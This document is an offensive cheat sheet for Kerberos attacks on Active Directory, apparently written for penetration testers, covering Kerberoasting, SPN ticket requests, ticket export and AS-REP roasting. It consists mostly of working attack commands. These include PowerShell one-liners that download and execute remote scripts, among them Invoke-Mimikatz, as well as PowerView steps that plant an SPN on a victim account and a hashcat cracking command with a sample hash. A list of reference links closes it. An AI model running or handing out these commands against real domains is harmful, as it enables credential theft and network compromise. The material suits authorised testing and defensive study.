========================================================================================================================
						Kerberos Attacks
========================================================================================================================



[+] Kerbose attack

./GetUserSPNs.py -dc-ip 192.168.168.10 sittingduck.info/notanadmin

https://github.com/CoreSecurity/impacket/blob/master/examples/GetUserSPNs.py



[+] GetUserSPNs.ps1


IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercon
tent.com/nidem/kerberoast/master/GetUserSPNs.ps1')




[+] Get-SPN


IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/
nullbind/Powershellery/master/Stable-ish/Get-SPN/Get-SPN.psm1")



Get-SPN -type service -search "MSSQL*"



[+] SetSPN

setspn -t sittingduck -q */*



========================================================================================================================
					Requesting SPN Kerberos Tickets
========================================================================================================================



[+] PowerShell Requesting

Add-Type -AssemblyName System.IdentityModel  

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/web01.medin.local"


Add-Type -AssemblyName System.IdentityModel

setspn.exe -T medin.local -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  

[+] PowerShell Requesting - Just Users


Add-Type -AssemblyName System.IdentityModel

IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/nidem/kerberoast/master/GetUserSPNs.ps1") | ForEach-Object {try{New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.ServicePrincipalName}catch{}}


========================================================================================================================
					Exporting the tickets
========================================================================================================================




[+] Mimikatz

IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1")

Invoke-Mimikatz -Command 'standard::base64 "kerberos::list /export" exit'


[+] Kirbi2John


 ./kirbi2john.py /root/empire-dev/downloads/BDW3E2G2ZRKCUS3B/*.kirbi

https://github.com/nidem/kerberoast/blob/master/kirbi2john.py
https://github.com/magnumripper/JohnTheRipper/blob/bleeding-jumbo/run/kirbi2john.py




========================================================================================================================
					Extract tickets without send request
========================================================================================================================


[+] PyKerberoast


python kerberoastv2.py -a 192.168.168.10 -b "dc=sittingduck,dc=info" -d sittingduck -u notanadmin

https://github.com/skelsec/PyKerberoast




[+] Impacket

./GetUserSPNs.py -request sittingduck.info/notanadmin

https://github.com/CoreSecurity/impacket/blob/master/examples/GetUserSPNs.py











========================================================================================================================
				AS-REP Roasting
========================================================================================================================




[+] Find users
 Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name


[+] ASREPRoast

Get-ASREPHash -UserName vi -Domain lab.com -Verbose


Invoke-ASREPRoast -Domain lab.local -Server 172.16.14.1 | select -expand Hash



[+] Invoke-Kerberoast

Invoke-Kerberoast -Domain lab.com |fl

https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1



[*] option
-OutputFormat Hashcat
-AdminCount

https://github.com/HarmJ0y/ASREPRoast/blob/master/ASREPRoast.ps1


[+] powerview 


Set-DomainObject -Identity victimuser -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
$User = Get-DomainUser victimuser 
$User | Get-DomainSPNTicket | fl
$User | Select serviceprincipalname
Set-DomainObject -Identity victimuser -Clear serviceprincipalname


https://github.com/PowerShellMafia/PowerSploit/blob/445f7b2510c4553dcd9451bc4daccb20c8e67cbb/Recon/PowerView.ps1


[*]Note
insert 23 after the $krb5asrep$








[+]Cracking

hashcat -m18200 '$krb5asrep$23$spot@offense.local:3171EA207B3A6FDAEE52BA247C20362E$56FE7DC0CABA8CB7D3A02A140C612A917DF3343C01BCDAB0B669EFA15B29B2AEBBFED2B4F3368A897B833A6B95D5C2F1C2477121C8F5E005AA2A588C5AE72AADFCBF1AEDD8B7AC2F2E94E94CB101E27A2E9906E8646919815D90B4186367B6D5072AB9EDD0D7B85519FBE33997B3D3B378340E3F64CAA92595523B0AD8DC8E0ABE69DDA178D8BA487D3632A52BE7FF4E786F4C271172797DCBBDED86020405B014278D5556D8382A655A6DB1787DBE949B412756C43841C601CE5F21A36A0536CFED53C913C3620062FDF5B18259EA35DE2B90C403FBADD185C0F54B8D0249972903CA8FF5951A866FC70379B9DA' -a 3 /usr/share/wordlists/rockyou.txt








========================================================================================================================
						Resources
========================================================================================================================




https://room362.com/post/2016/kerberoast-pt1/
https://room362.com/post/2016/kerberoast-pt2/
https://room362.com/post/2016/kerberoast-pt3/
https://www.qomplx.com/qomplx-knowledge-kerberoasting-attacks-explained/
https://adsecurity.org/?p=2293
http://www.harmj0y.net/blog/activedirectory/roasting-as-reps/
http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/
http://www.harmj0y.net/blog/redteaming/targeted-plaintext-downgrades-with-powerview/
http://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/
https://adsecurity.org/?page_id=183
https://medium.com/@jsecurity101/ioc-differences-between-kerberoasting-and-as-rep-roasting-4ae179cdf9ec
https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat
https://stealthbits.com/blog/cracking-active-directory-passwords-with-as-rep-roasting/
https://akijosberryblog.wordpress.com/2018/01/17/as-rep-roasting-cracking-user-account-password/
https://luemmelsec.github.io/Kerberoasting-VS-AS-REP-Roasting/
https://github.com/clong/DetectionLab
https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting
https://blog.xpnsec.com/kerberos-attacks-part-1/
https://blog.xpnsec.com/kerberos-attacks-part-2/
https://pentestlab.blog/tag/invoke-kerberoast/
https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html
https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/
https://adsecurity.org/?p=2011
https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec/


